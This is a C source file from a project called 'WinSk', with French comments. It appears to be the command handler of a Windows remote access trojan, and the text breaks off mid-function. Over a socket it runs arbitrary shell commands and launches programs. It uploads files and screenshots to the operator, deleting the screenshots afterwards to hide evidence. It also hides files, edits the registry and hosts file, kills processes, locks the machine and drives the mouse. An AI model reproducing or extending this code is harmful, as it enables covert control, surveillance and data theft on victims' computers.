//=============================================================================
// Projet : WinSk
// Fichier : commands.c
//
// @ Les préfixes des commandes ne devraient pas/jamais contenir des espaces.
//=============================================================================

#include "client.h"


//=============================================================================
//                              Constantes
//=============================================================================

#define MAX_PARAMETERS     6
#define MAX_PARAM_SIZE     BUF_SIZE//1024

#define MAX_DRIVES_BUF     100

//=============================================================================
//       Fonction qui récupère le premier paramètre d'une commande
//
// @ char tab[] == char *tab
//=============================================================================

void recup1erPrametre(char cmdPrefixe[], char *cmd, char *ptCmd, int *lenCmd, int *lenMax, char *parametre1)
{
    (*lenCmd) = strlen(cmdPrefixe) + 1; // +1 de l'espace ' '
    (*lenMax) = strlen(cmd) - (*lenCmd);
    strncpy(parametre1, ptCmd + (*lenCmd), (*lenMax));
    parametre1[(*lenMax)] = '\0';
}

//=============================================================================
//       Fonction qui effectue la commande(buffer) passé en argument
//
// @reply == répondre
//=============================================================================

void effectuerCommande(SOCKET sock, char *buffer, BOOL reply)
{
   // cmd and buffer are pointers on the same thing/place i know,
   // so we can remove cmd for example, but it's so hard to rewrite all these lines below
   char *cmd = buffer, *ptCmd = NULL;
   char cmdPrefixe[32], parametre[MAX_PARAMETERS][MAX_PARAM_SIZE];
   int lenCmd, lenMax;
   
   // (*) Ajoute un ToDo à la liste, ex: Add_ToDo time|commande
   if ((ptCmd = strstr(cmd, "Add_ToDo")) != NULL)
   {
      recup1erPrametre("Add_ToDo", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      int i = 0, j, len = strlen(parametre[0]);
      BOOL resultat = FALSE;

      // on récupère les paramètres
      
      // 1 - Time
      j = 0;
      while (parametre[0][i] != '|' && i < len)
      {
         parametre[1][j] = parametre[0][i];
         i++;
         j++;
      }
      parametre[1][j] = 0; // fin de chaine
      int time = strtol(parametre[1], NULL, 10); // sauvegarde
      
      // 2 - Commande
      i++;
      j = 0;
      while (i < len)
      {
         parametre[1][j] = parametre[0][i];
         i++;
         j++;
      }
      parametre[1][j] = 0; // fin de chaine
      
      // si les paramètres sont corrects
      if (time > 0 && strlen(parametre[1]) > 0)
      {
         // ajout
         ToDoList = push_ToDo(ToDoList, parametre[1], time);
         resultat = TRUE;
      }
      
      if (reply)
      {
         sprintf(buffer, "Add_ToDo %s", resultat ? "Success" : "Error");
         write_server(sock, buffer);
      }
   }
   
   // (*) Supprime un ToDo de la liste, ex: Delete_ToDo id
   else if ((ptCmd = strstr(cmd, "Delete_ToDo")) != NULL)
   {
      int id = 0;
      BOOL resultat = FALSE;
      
      sscanf(ptCmd, "%s%d", cmdPrefixe, &id);
      
      if (id > 0)
      {
          ToDoList = delete_ToDo(ToDoList, id);
          resultat = TRUE;
      }
      
      if (reply)
      {
         sprintf(buffer, "Delete_ToDo %s", resultat ? "Success" : "Error");
         write_server(sock, buffer);
      }
   }
   
   // (*) Retourne le contenu de la ToDoList
   else if (!strcmp(cmd, "List_ToDo"))
   {
      if (ToDoList == NULL) // si la ToDoList est vide
          lstrcpy(buffer, "[No ToDo]");
      else
          lstrcpy(buffer, ""); // vidage du buffer
      
      ToDo *iterToDo; // iterator
      for (iterToDo = ToDoList; iterToDo != NULL; iterToDo = iterToDo->next) {
          sprintf(buffer, "%s[%d]%d|%s", buffer, iterToDo->id, iterToDo->time, iterToDo->commande);
      }
      
      if (reply)
         write_server(sock, buffer);
   }
   
   // (*) Vide la ToDoList
   else if (!strcmp(cmd, "Free_ToDo"))
   {
      free_ToDo(ToDoList);
      ToDoList = NULL; // rénitialisation (nécessaire)
      
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   
   // (1) Visibilité/invisibilité du bureau
   else if (!strcmp(cmd, "Hide_Desktop"))
   {
      afficherBureau(FALSE);
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   else if (!strcmp(cmd, "Show_Desktop"))
   {
      afficherBureau(TRUE);
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   
   // (2) Visibilité/invisibilité de la barre de tâches
   else if (!strcmp(cmd, "Hide_Taskbar")) 
   {
      afficherBarreDesTaches(FALSE);
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   else if (!strcmp(cmd, "Show_Taskbar")) 
   {
      afficherBarreDesTaches(TRUE);
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   
   // (3) Arrêt/redémarrage/mise en veille de l'ordinateur
   else if (!strcmp(cmd, "Turn_Off"))
   {
      if (reply)
         write_server(sock, RECEIVED_RESPONSE);
      getPrivilege();
      ExitWindowsEx(EWX_POWEROFF, 0); /* Fermeture de windows */
   }
   else if (!strcmp(cmd, "Reboot"))
   {
      if (reply)
         write_server(sock, RECEIVED_RESPONSE);
      getPrivilege();
      ExitWindowsEx(EWX_REBOOT, 0); /* Redémarrage de windows */
   }
   else if (!strcmp(cmd, "Menveille"))
   {
      if (reply)
         write_server(sock, RECEIVED_RESPONSE);
      SetSuspendState(FALSE, FALSE, FALSE); /* Mise en veille */
   }
   
   // (4) Blockage de l'ordinateur (Boucle infinie)
   else if (!strcmp(cmd, "Stop_Crunning"))
   {
      if (reply)
         write_server(sock, RECEIVED_RESPONSE);
         
      HWND hCWnd;
      
      while(1)
      {
         hCWnd = GetForegroundWindow();
         ShowWindow(hCWnd, SW_HIDE); /* On cache la fenêtre actuelle infiniment */
      }
   }
   
   // (5) Ecran noir (On éteint le moniteur pendant 10 secondes)
   else if (!strcmp(cmd, "Black_Screen"))
   {
      /* Eteint l'écran, attend 10s puis le rallume */
      DefWindowProc(GetDesktopWindow(), WM_SYSCOMMAND, SC_MONITORPOWER, 1);
      Sleep(10000);
      DefWindowProc(GetDesktopWindow(), WM_SYSCOMMAND, SC_MONITORPOWER, -1);
      
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   
   // (6) Déconnexion de l'internet (si modem Adsl)
   else if (!strcmp(cmd, "Adsl_Disconnect"))
   {
      InternetAutodialHangup(0);
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   
   // (7) Connexion à internet (si modem Adsl)
   else if (!strcmp(cmd, "Adsl_Connect"))
   {
      if (!etatConnexion()) 
         InternetAutodial(INTERNET_AUTODIAL_FORCE_UNATTENDED, 0); /* Connexion automatique */
      
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   
   // (8) Ouverture/Fermeture du lecteur cd-rom, ex: Open_Cd-rom &_Close
   else if ((ptCmd = strstr(cmd, "Open_Cd-rom")) != NULL)
   {
      HMODULE hDll = LoadLibrary("winmm.dll"); /* Chargement de la dll aproprié */
      typedef MCIERROR (WINAPI* joMciSendString) ( LPCTSTR lpszCommand,LPTSTR lpszReturnString,UINT cchReturn,HANDLE hwndCallback );
      joMciSendString MyFunc = (joMciSendString)GetProcAddress(hDll, "mciSendStringA");
      MyFunc("Set cdaudio door open wait", NULL, 0, NULL); /* Ouverture du lecteur cd-rom */
      
      if (strstr(ptCmd, "&_Close") != NULL)
      {
         Sleep(5000); /* Attente de 5 secondes */
         MyFunc("Set cdaudio door closed wait", NULL, 0, NULL); /* Fermeture du lecteur cd-rom */
      }
      
      FreeLibrary(hDll);
      
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   
   // (9) Réglage du volume, Set_Volume 0 (Muet)
   else if ((ptCmd = strstr(cmd, "Set_Volume")) != NULL)
   {
      //sscanf(ptCmd, "%s%s", cmdPrefixe, parametre[0]);
      
      recup1erPrametre("Set_Volume", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      DWORD dwOldVolume, dwNewVolume;
      BOOL resultat;
      
      dwNewVolume = strtol(parametre[0], NULL, 10); //@ strtol renvoie 0 en cas d'echec de conversion
      
      // si on peut récupérer l'ancienne valeur/l'ancien niveau du volume, + le nouveau niveau du volume est entre 0 et 65535
      if (waveOutGetVolume(NULL, &dwOldVolume) == MMSYSERR_NOERROR && dwNewVolume >= 0 && dwNewVolume <= 65535)
      {
          waveOutSetVolume(NULL, dwNewVolume); // modification du volume (juste de l'application actuelle..)
          resultat = TRUE;
      }
      else
          resultat = FALSE;
      
      sprintf(buffer, "Set_Volume [%d => %d] %s", dwOldVolume, dwNewVolume, resultat ? "Success" : "Error");
      //ajouterAuLog(buffer);    
      
      if (reply)
         write_server(sock, buffer);
   }
   
   // (10) Création d'un fichier, ex : Create_File c: test.txt 0/1 hide/show test
   else if ((ptCmd = strstr(cmd, "Create_File")) != NULL)
   {
      sscanf(ptCmd, "%s%s%s%s%s%s", cmdPrefixe, parametre[0], parametre[1], parametre[2], parametre[3], parametre[4]);
      BOOL resultat = ecrireDansFichier(parametre[0], parametre[1], parametre[4], strtol(parametre[2], NULL, 10));
      sprintf(buffer, "Create_File %s", resultat ? "Success" : "Error");
      //ajouterAuLog(buffer);
      if (reply)
         write_server(sock, buffer);
      if (!strcmp(parametre[3], "hide"))
      {
         lstrcat(parametre[0], "\\");
         lstrcat(parametre[0], parametre[1]);
         SetFileAttributes(parametre[0], FILE_ATTRIBUTE_HIDDEN);
      }
   }
   
   // (11) Création d'un dossier, ex : Create_Directory c: D:\\dossier1
   else if ((ptCmd = strstr(cmd, "Create_Directory")) != NULL)
   {
      recup1erPrametre("Create_Directory", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      BOOL resultat = CreateDirectory(parametre[0], NULL); /* On crée alors un nv dossier (dans la racine) */
      
      sprintf(buffer, "Create_Directory %s", resultat ? "Success" : "Error");
      //ajouterAuLog(buffer);
      if (reply)
         write_server(sock, buffer);
   }
   
   // (12) Suppression d'un dossier, ex : Del_Directory c: D:\\dossier1
   else if ((ptCmd = strstr(cmd, "Del_Directory")) != NULL)
   {
      recup1erPrametre("Del_Directory", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      int resultat = RemoveDirectory(parametre[0]);
      
      if (resultat == 0)
         sprintf(buffer, "Del_Directory Error");
      else
         sprintf(buffer, "Del_Directory Success");
      //ajouterAuLog(buffer);
      if (reply)
         write_server(sock, buffer);
   }
   
   // (13) Changement du temp, ex : Change_Time 03/01/2014-13:45
   else if ((ptCmd = strstr(cmd, "Change_Time")) != NULL)
   {
      sscanf(ptCmd, "%s%s/%s/%s-%s:%s", cmdPrefixe, parametre[0], parametre[1], parametre[2], parametre[3], parametre[4]);
      SYSTEMTIME Time;
      Time.wYear = strtol(parametre[2], NULL, 10); /* Année */
      Time.wMonth = strtol(parametre[1], NULL, 10); /* Mois */
      Time.wDay = strtol(parametre[0], NULL, 10); /* Jour */
      Time.wHour = strtol(parametre[3], NULL, 10); /* Heure */
      Time.wMinute = strtol(parametre[4], NULL, 10); /* Minutes */
      Time.wSecond = 0;
      Time.wMilliseconds = 0;
      BOOL resultat = SetSystemTime(&Time);
      sprintf(buffer, "Change_Time %s", resultat ? "Success" : "Error");
      //ajouterAuLog(buffer);
      if (reply)
         write_server(sock, buffer);
      /* Ps : Comme but de changer le temp c'est de couper la connexion avec certains sites */
   }
   
   // (14) Faire un son sous forme de bip, ex : Bip_Bip 2 5000   (2bip avec un ecart de 5 secondes)
   else if ((ptCmd = strstr(cmd, "Bip_Bip")) != NULL)
   {
      sscanf(ptCmd, "%s%s%s", cmdPrefixe, parametre[0], parametre[1]);
      int bip = 0, repeat = strtol(parametre[0], NULL, 10), sleepTime = strtol(parametre[1], NULL, 10);
      
      for (bip = 0; bip < repeat; bip++)
      {
         Beep(1000, 500);
         Sleep(sleepTime);
      }
      
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   
   // (15) Commandes Batch (fera apparaittre la console), ex : Batch_Cmd ping www.google.com / Batch_Cmd copy c:\\test.txt f:\\test.txt
   else if ((ptCmd = strstr(cmd, "Batch_Cmd")) != NULL)
   {
      int i;
      
      for (i = 0; i < 3; i++)
         ZeroMemory(parametre[i], sizeof(parametre[i]));
      
      sscanf(ptCmd, "%s%s%s", cmdPrefixe, parametre[0], parametre[1], parametre[2]);
      
      for (i = 1; i < 3; i++)
      {
         lstrcat(parametre[0], " "); /* Espace */
         lstrcat(parametre[0], parametre[i]); /* On concatène les paramètres */
      }
      system(parametre[0]); /* On lance la commande batch */
      
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   
   // (16) Exploration du dossier spécifié, ex : Explore_Directory C:\\|D:\\dossier1
   else if ((ptCmd = strstr(cmd, "Explore_Directory")) != NULL)
   {
      recup1erPrametre("Explore_Directory", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      if (exploreDirectory(parametre[0]))
      {
          int fTaille = tailleFichier(FILES_PATH, NOM_EXPLORE_FILE, FALSE);
          char *chaine;
          chaine = malloc(fTaille); /* Allocation mémoire */
          ZeroMemory(chaine, fTaille);
          lireFichier(FILES_PATH, NOM_EXPLORE_FILE, chaine, 1);
          if (fTaille > BUF_SIZE - 1)
          {
              int i;
              for (i = 0; i < BUF_SIZE - 1 ; i++)
              {
                  if (i < BUF_SIZE - 4)
                      buffer[i] = chaine[i];
                  else
                      buffer[i] = '.';
              }
              buffer[i] = '\0';
          }
          else
              lstrcpy(buffer, chaine);
          
          free(chaine);
      }
      else
          sprintf(buffer, "%s [No such Path]", parametre[0]);
      // sauvegarde
      if (reply)
         write_server(sock, buffer);
      //ajouterAuLog(buffer);
   }
   
   // (17) Lancement du programme/site web spécifié : Shell_Exec c:\\User\\svhost.exe / Shell_Exec www.google.com
   else if ((ptCmd = strstr(cmd, "Shell_Exec")) != NULL)
   {
      recup1erPrametre("Shell_Exec", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      ShellExecute(NULL, "open", parametre[0], NULL, NULL, SW_SHOWNORMAL);
      
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   
   // (18) Lecture du fichier spécifié, ex : Read_File c:\\test.txt / Read_File hosts
   else if ((ptCmd = strstr(cmd, "Read_File")) != NULL)
   {
      recup1erPrametre("Read_File", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      char *filePath, *fileName;
      if (!strcmp(parametre[0], "hosts"))
      {
          filePath = HOSTS_PATH;
          fileName = "hosts";
      }
      else if (!strcmp(parametre[0], "log"))
      {
           filePath = FILES_PATH;
           fileName = NOM_LOG_FILE;
      }
      else if (!strcmp(parametre[0], "config"))
      {
           filePath = FILES_PATH;
           fileName = NOM_CONFIG_FILE;
      }
      else if (!strcmp(parametre[0], "explore"))
      {
           filePath = FILES_PATH;
           fileName = NOM_EXPLORE_FILE;
      }
      else
      {
          char *nomProgram = recupNomDuProgrammeDepuisPath(parametre[0]);
          strcpy(parametre[1], nomProgram);
          free(nomProgram);
          if (strlen(parametre[0]) > strlen(parametre[1]))
             parametre[0][strlen(parametre[0]) - strlen(parametre[1]) - 1] = '\0'; // -1 de '\\'
          else
             parametre[0][0] = '\0';
          
          filePath = parametre[0];
          fileName = parametre[1];
      }
      
      // Au travail
      char *chaine;
      int fTaille = tailleFichier(filePath, fileName, FALSE);
      if (fTaille > 0)
      {
         chaine = malloc(fTaille); /* Allocation mémoire */
         ZeroMemory(chaine, fTaille);
         lireFichier(filePath, fileName, chaine, 1);
         if (fTaille > BUF_SIZE - 1) /* Pour eviter le dépassement de capacité du buffer */
         {
            int i;
            for (i = 0; i < BUF_SIZE - 1 ; i++)
            {
                if (i < BUF_SIZE - 4)
                   buffer[i] = chaine[i];
                else
                    buffer[i] = '.';
            }
            
            buffer[i] = '\0';
         }
         else
             strcpy(buffer, chaine);
             
         free(chaine);
      }
      else
          sprintf(buffer, "%s\\%s [No such File or Directory]", filePath, fileName);
      
      // sauvegarde
      if (reply)
         write_server(sock, buffer);
      //ajouterAuLog(buffer);
   }
   
   // (19) Suppression du fichier spécifié, ex : Del_File c:\\text.txt
   else if ((ptCmd = strstr(cmd, "Del_File")) != NULL)
   {
      recup1erPrametre("Del_File", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      BOOL resultat = DeleteFile(parametre[0]);
      sprintf(buffer, "Del_File %s", resultat ? "Success" : "Error");
      
      if (reply)
         write_server(sock, buffer);
   }
   
   // (20) Retourne les informations(taille, system, caché) sur un fichier/dossier, ex: Get_F_Info c:\\test.txt
   else if ((ptCmd = strstr(cmd, "Get_F_Info")) != NULL)
   {
      recup1erPrametre("Get_F_Info", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      long f_size;
      BOOL IS_SYSTEM = FALSE, IS_HIDDEN = FALSE;
      
      DWORD attributes = GetFileAttributes(parametre[0]);
      
      // on récupère la taille du fichier | si dossier ou fichier introuvable la taille sera == -1
      if (attributes == INVALID_FILE_ATTRIBUTES || (attributes & FILE_ATTRIBUTE_DIRECTORY))
         f_size = -1;
      else
         f_size = tailleFichier(parametre[0], "", TRUE);
      
      // on vérifie si le fichier est un fichier SYSTEM et/ou Caché
      if (attributes & FILE_ATTRIBUTE_SYSTEM)
         IS_SYSTEM = TRUE;
      if (attributes & FILE_ATTRIBUTE_HIDDEN)
         IS_HIDDEN = TRUE;
      
      sprintf(buffer, "F_Info>%d|%d|%d", f_size, IS_SYSTEM, IS_HIDDEN);
      
      if (reply)
         write_server(sock, buffer);
   }
   
   // (21) Affiche/Cache un fichier/dossier, ex: Set_F_Info SYSTEM|HIDDEN|SYSTEM&HIDDEN|NORMAL c:\\test.txt
   else if ((ptCmd = strstr(cmd, "Set_F_Info")) != NULL)
   {
      recup1erPrametre("Set_F_Info", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      BOOL COMMAND_ERROR = FALSE;
      int resultat;
      
      // si l'option SYSTEM&HIDDEN est spécifiée (doit être en premier, si nn, conflit avec les 2 else if qui suivent)
      if ((ptCmd = strstr(parametre[0], "SYSTEM&HIDDEN")) != NULL)
      {
          recup1erPrametre("SYSTEM&HIDDEN", parametre[0], ptCmd, &lenCmd, &lenMax, parametre[1]);
          resultat = SetFileAttributes(parametre[1], FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
      }
      else if ((ptCmd = strstr(parametre[0], "SYSTEM")) != NULL) // si nn si SYSTEM
      {
          recup1erPrametre("SYSTEM", parametre[0], ptCmd, &lenCmd, &lenMax, parametre[1]);
          resultat = SetFileAttributes(parametre[1], FILE_ATTRIBUTE_SYSTEM);
      }
      else if ((ptCmd = strstr(parametre[0], "HIDDEN")) != NULL) // si nn si HIDDEN
      {
          recup1erPrametre("HIDDEN", parametre[0], ptCmd, &lenCmd, &lenMax, parametre[1]);
          resultat = SetFileAttributes(parametre[1], FILE_ATTRIBUTE_HIDDEN);
      }
      else if ((ptCmd = strstr(parametre[0], "NORMAL")) != NULL) // si nn si NORMAL
      {
          recup1erPrametre("NORMAL", parametre[0], ptCmd, &lenCmd, &lenMax, parametre[1]);
          resultat = SetFileAttributes(parametre[1], FILE_ATTRIBUTE_NORMAL);
      }
      else
         COMMAND_ERROR = TRUE;
      
      if (!COMMAND_ERROR)
          sprintf(buffer, "Set_F_Info %s", resultat ? "Success" : "Error");
      else
          sprintf(buffer, "Set_F_Info Error");
      
      if (reply)
         write_server(sock, buffer);
   }
   
   // (22) Liste des processus, ex: Liste_Processus
   else if (!strcmp(cmd, "Liste_Processus"))
   {
      listeDesProcessus(buffer, FALSE);
      // sauvegarde
      //envoyerMessage(buffer, "Liste");
      if (reply)
         write_server(sock, buffer);
      //ajouterAuLog(buffer);
   }
   
   // (23) Arrêter un programme spécifié, ex : Stop_Prg programme.exe
   else if ((ptCmd = strstr(cmd, "Stop_Prg")) != NULL)
   {
      recup1erPrametre("Stop_Prg", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      BOOL resultat = arreterProgramme(parametre[0]);
      sprintf(buffer, "Stop_Prg %s", resultat ? "Success" : "Error");
      //ajouterAuLog(buffer);
      if (reply)
         write_server(sock, buffer);
   }
   
   // (24) Blocker un site web par le fichier hosts, ex : Block_Site www.google.com
   else if ((ptCmd = strstr(cmd, "Block_Site")) != NULL)
   {
      sscanf(ptCmd, "%s%s", cmdPrefixe, parametre[1]);
      lstrcpy(parametre[0], "127.0.0.1 ");
      lstrcat(parametre[0], parametre[1]);
      lstrcat(parametre[0], "\n"); /* Retour à la ligne */
      BOOL resultat = ecrireDansFichier(HOSTS_PATH, "hosts", parametre[0], 0);
      sprintf(buffer, "Block_S %s", resultat ? "Success" : "Error");
      //ajouterAuLog(buffer);
      if (reply)
         write_server(sock, buffer);
   }
   
   // (25) Ajouter/Modifier une valeur du registre, ex : Reg_Set CREER/OUVRIR/SUPPRIMER software\\Microsoft 
   //  HKEY_CURRENT_USER|HKEY_CLASSES_ROOT|HKEY_LOCAL_MACHINE|HKEY_USERS|HKEY_CURRENT_CONFIG test REG_BINARY|REG_SZ|REG_DWORD 1
   else if ((ptCmd = strstr(cmd, "Reg_Set")) != NULL)
   {
      //sscanf(ptCmd, "%s%s%s%s%s%s%s", cmdPrefixe, parametre[0], parametre[1], parametre[2], parametre[3], parametre[4], parametre[5]);
      
      recup1erPrametre("Reg_Set", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      HKEY racine;
      int type;
      BOOL weHaveError = FALSE;
      
      // on récupère l'action
      if ((ptCmd = strstr(parametre[0], "CREER")) != NULL)
      {
          recup1erPrametre("CREER", cmd, ptCmd, &lenCmd, &lenMax, parametre[1]);
          lstrcpy(parametre[2], "CREER");
      }
      else if ((ptCmd = strstr(parametre[0], "OUVRIR")) != NULL)
      {
          recup1erPrametre("OUVRIR", cmd, ptCmd, &lenCmd, &lenMax, parametre[1]);
          lstrcpy(parametre[2], "OUVRIR");
      }
      else if ((ptCmd = strstr(parametre[0], "SUPPRIMER")) != NULL)
      {
          recup1erPrametre("SUPPRIMER", cmd, ptCmd, &lenCmd, &lenMax, parametre[1]);
          lstrcpy(parametre[2], "SUPPRIMER");
      }
      else
      {
         weHaveError = TRUE;
         goto reg_set_error;
      }
      
      // on récupère le path (on ne fait rien a part trancher la chaine)
      int i = 0;
      while (parametre[1][i] != '|' && i < strlen(parametre[1]))
          i++;
      
      parametre[1][i] = 0; // ou bien '\0'
      
      // on récupère la racine
      if ((ptCmd = strstr(parametre[0], "HKEY_CURRENT_USER")) != NULL)
      {
         racine = HKEY_CURRENT_USER;
         recup1erPrametre("HKEY_CURRENT_USER", cmd, ptCmd, &lenCmd, &lenMax, parametre[3]);
      }
      else if ((ptCmd = strstr(parametre[0], "HKEY_CLASSES_ROOT")) != NULL)
      {
         racine = HKEY_CLASSES_ROOT;
         recup1erPrametre("HKEY_CLASSES_ROOT", cmd, ptCmd, &lenCmd, &lenMax, parametre[3]);
      }
      else if ((ptCmd = strstr(parametre[0], "HKEY_LOCAL_MACHINE")) != NULL)
      {
         racine = HKEY_LOCAL_MACHINE;
         recup1erPrametre("HKEY_LOCAL_MACHINE", cmd, ptCmd, &lenCmd, &lenMax, parametre[3]);
      }
      else if ((ptCmd = strstr(parametre[0], "HKEY_USERS")) != NULL)
      {
         racine = HKEY_USERS;
         recup1erPrametre("HKEY_USERS", cmd, ptCmd, &lenCmd, &lenMax, parametre[3]);
      }
      else if ((ptCmd = strstr(parametre[0], "HKEY_CURRENT_CONFIG")) != NULL)
      {
         racine = HKEY_CURRENT_CONFIG;
         recup1erPrametre("HKEY_CURRENT_CONFIG", cmd, ptCmd, &lenCmd, &lenMax, parametre[3]);
      }
      else
      {
         weHaveError = TRUE;
         goto reg_set_error;
      }
      
      // on récupère le nom (on ne fait rien a part trancher la chaine içi aussi)
      i = 0;
      while (parametre[3][i] != '|' && i < strlen(parametre[3]))
          i++;
      
      parametre[3][i] = 0; // ou bien '\0'
      
      // on récupère le type
      if ((ptCmd = strstr(parametre[0], "REG_BINARY")) != NULL)
      {
         type = REG_BINARY;
         recup1erPrametre("REG_BINARY", cmd, ptCmd, &lenCmd, &lenMax, parametre[5]);
      }
      else if ((ptCmd = strstr(parametre[0], "REG_SZ")) != NULL)
      {
         type = REG_SZ;
         recup1erPrametre("REG_SZ", cmd, ptCmd, &lenCmd, &lenMax, parametre[5]);
      }
      else if ((ptCmd = strstr(parametre[0], "REG_DWORD")) != NULL)
      {
         type = REG_DWORD;
         recup1erPrametre("REG_DWORD", cmd, ptCmd, &lenCmd, &lenMax, parametre[5]);
      }
      else
      {
         weHaveError = TRUE;
         goto reg_set_error;
      }
      
      // on récupère la valeur (on ne fait rien a part trancher la chaine içi aussi)
      i = 0;
      while (parametre[5][i] != '|' && i < strlen(parametre[5]))
          i++;
      
      parametre[5][i] = 0; // ou bien '\0'
      
      // au travail
      BOOL resultat = ajouterModifierRegistre(parametre[2], parametre[1], racine, parametre[3], type, parametre[5]);
      sprintf(buffer, "Reg_Set %s", resultat ? "Success" : "Error");
      //ajouterAuLog(buffer);
      
      reg_set_error: // étiquette
      if (weHaveError)
         sprintf(buffer, "Reg_Set Error");
      
      if (reply)
         write_server(sock, buffer);
   }
   
   // (26) Arrêter le programme completement, ex: Exit_Order
   else if (!strcmp(cmd, "Exit_Order"))
   {
      if (reply)
         write_server(sock, RECEIVED_RESPONSE);
      exit(0);
   }
   
   // (27) Envoyer un fichier, ex: Send_File C:\\image.jpg
   else if ((ptCmd = strstr(cmd, "Send_File")) != NULL)
   {
      recup1erPrametre("Send_File", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      if (!strcmp(parametre[0], "log"))
      {
         char tmp[strlen(FILES_PATH)+ strlen(NOM_LOG_FILE)+3];
         sprintf(tmp, "%s\\%s", FILES_PATH, NOM_LOG_FILE);
         send_file(sock, tmp);
      }
      else if (!strcmp(parametre[0], "explore"))
      {
         char tmp[strlen(FILES_PATH)+ strlen(NOM_EXPLORE_FILE)+3];
         sprintf(tmp, "%s\\%s", FILES_PATH, NOM_EXPLORE_FILE);
         send_file(sock, tmp);
      }
      else if ((ptCmd = strstr(parametre[0], "explore->")) != NULL)
      {
           // j'ai pas mis le '>' car recup1erPrametre() prend en compte qu'il y'a un caractère de plus
           //(un espace normalement) mais peu importe puisque '>' est aussi un caractère
           recup1erPrametre("explore-", parametre[0], ptCmd, &lenCmd, &lenMax, parametre[1]); // on récupère le path/chemin à explorer
           // on l'explore
           exploreDirectory(parametre[1]); // si erreur (on aura un fichier explore vide)
           // on envoie le fichier explore
           char tmp[strlen(FILES_PATH)+ strlen(NOM_EXPLORE_FILE)+3];
           sprintf(tmp, "%s\\%s", FILES_PATH, NOM_EXPLORE_FILE);
           send_file(sock, tmp);
      }
      else if (!strcmp(parametre[0], "tasks"))
      {
          // Récupération des tasks/processus
          listeDesProcessus("", TRUE);
          // Envoie
          char tmp[strlen(FILES_PATH)+ strlen(NOM_TASKS_FILE)+3];
          sprintf(tmp, "%s\\%s", FILES_PATH, NOM_TASKS_FILE);
          send_file(sock, tmp);
      }
      else if (!strcmp(parametre[0], "config"))
      {
         char tmp[strlen(FILES_PATH)+ strlen(NOM_CONFIG_FILE)+3];
         sprintf(tmp, "%s\\%s", FILES_PATH, NOM_CONFIG_FILE);
         send_file(sock, tmp);
      }
      else
      {
         send_file(sock, parametre[0]);
      }
      
      // sauvegarde
      //ajouterAuLog(buffer);
   }
   
   // (28) Recevoir un fichier, ex: Recv_File image.jpg
   else if ((ptCmd = strstr(cmd, "Recv_File")) != NULL)
   {
      recup1erPrametre("Recv_File", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      char *pt = recupNomDuProgrammeDepuisPath(parametre[0]);
      //strcpy(fileRecvName, pt);
      sprintf(fileRecvName, "%s\\%s", Parametres.RepertoireInfiltration, pt);
      free(pt);
      WE_RECV_FILE = TRUE;
      //pour activer la maj après, il faut utiliser la commande Shell_Exec nomExe.exe
   }
   
   // (29) Envoyer une capture d'ecran, ex: Send_Pict 50 (50 c'est la qualité de l'image)
   else if ((ptCmd = strstr(cmd, "Send_Pict")) != NULL)
   {
      /* captecran */
      char capture[MAX_PATH];
      //sscanf(ptCmd, "%s%s", cmdPrefixe, parametre[0]);
      //int qualite = atoi(parametre[0]);
      int qualite = 0;
      sscanf(ptCmd, "%s%d", cmdPrefixe, &qualite);
      if (qualite > 100 || qualite < 5)
         qualite = 70; // moyen ;)
      capturerEcran(capture, 0, 0, qualite, FALSE); /* capture d'écran (Jpeg) */
      /* envoie */
      send_file(sock, capture);
      /* suppression de la preuve ;) */
      DeleteFile(capture);
      // sauvegarde
      //ajouterAuLog(buffer);
   }
   
   // (30) Envoyer une capture d'ecran minimisé selon width and height, ex: Send_Small_Pict 1024 768
   else if ((ptCmd = strstr(cmd, "Send_Small_Pict")) != NULL)
   {
      /* captecran */
      char capture[MAX_PATH];
      int width = 0, height = 0;
      sscanf(ptCmd, "%s%d%d", cmdPrefixe, &width, &height);
      if (width <= 0 || height <= 0)
      {
         width = 512;
         height = 384;
      }
      capturerEcran(capture, width, height, 0, TRUE);  /* capture d'écran (Bitmap == pas de compression) */
      /* envoie */
      send_file(sock, capture);
      /* suppression de la preuve ;) */
      DeleteFile(capture);
      // sauvegarde
      //ajouterAuLog(buffer);
   }
   
   // (31) Clic sourie Gauche, ex: L_Mouse_Clic x y width height
   else if ((ptCmd = strstr(cmd, "L_Mouse_Clic")) != NULL)
   {
      POINT pos;
      int width, height;
      sscanf(ptCmd, "%s%d%d%d%d", cmdPrefixe, &pos.x, &pos.y, &width, &height);
      pos.x *= (float) SCREEN_X / width;
      pos.y *= (float) SCREEN_Y / height;
      SetCursorPos(pos.x, pos.y); /* Posionnement de la sourie */
      mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); /* Enfoncement */
      Sleep(6);
      mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); /* Relachement */
   }
   
   // (32) Double Clic sourie Gauche, ex: D_L_Mouse_Clic x y width height
   else if ((ptCmd = strstr(cmd, "D_L_Mouse_Clic")) != NULL)
   {
      POINT pos;
      int width, height;
